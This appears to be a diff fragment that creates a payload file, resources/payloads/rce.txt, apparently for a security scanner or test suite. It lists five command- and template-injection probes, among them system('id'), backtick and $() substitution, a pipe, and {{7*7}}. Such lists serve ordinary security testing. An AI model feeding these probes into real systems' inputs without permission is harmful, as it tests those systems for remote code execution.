@@ -1,0 +1,6 @@
+# resources/payloads/rce.txt should contain:
+;system('id')
+`id`
+$(id)
+|id
+{{7*7}}
